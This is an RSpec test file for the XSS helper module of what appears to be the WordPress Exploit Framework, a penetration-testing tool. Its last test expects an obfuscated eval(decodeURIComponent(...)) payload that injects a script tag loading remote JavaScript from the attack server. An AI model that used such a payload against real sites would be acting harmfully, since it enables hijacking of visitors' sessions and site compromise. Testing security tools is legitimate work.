require_relative '../spec_helper'

describe Wpxf::WordPress::Xss do
  # Dummy class for tests.
  class Subject < Wpxf::Module
    include Wpxf::WordPress::Xss
  end

  let(:subject) { Subject.new }

  before :each do
    subject.set_option_value('xss_host', '127.0.0.1')
    subject.set_option_value('xss_path', 'path')
    subject.set_option_value('http_server_bind_port', 1234)
  end

  describe '#new?' do
    it 'registers xss_host and xss_path options' do
      expect(subject.get_option('xss_host')).to_not be_nil
      expect(subject.get_option('xss_path')).to_not be_nil
    end
  end

  describe '#xss_host' do
    it 'returns the normalized value of the xss_host option' do
      expect(subject.xss_host).to eq '127.0.0.1'
    end
  end

  describe '#xss_path' do
    it 'returns the normalized value of the xss_path option' do
      expect(subject.xss_path).to eq 'path'
    end
  end

  describe '#xss_url' do
    it 'returns the URL to be requested by the XSS attack' do
      expect(subject.xss_url).to eq 'http://127.0.0.1:1234/path'
    end
  end

  describe '#xss_include_script' do
    it 'returns the encoded JS include script wrapped in an eval call' do
      encoded = 'eval(decodeURIComponent(/var%20a%20%3D%20document.createElem'\
                'ent%28%22script%22%29%3Ba.setAttribute%28%22src%22%2C%20%22h'\
                'ttp%3A%2F%2F127.0.0.1%3A1234%2Fpath%22%29%3Bdocument.head.app'\
                'endChild%28a%29%3B/.source))'
      expect(subject.xss_include_script).to eq encoded
    end
  end
end
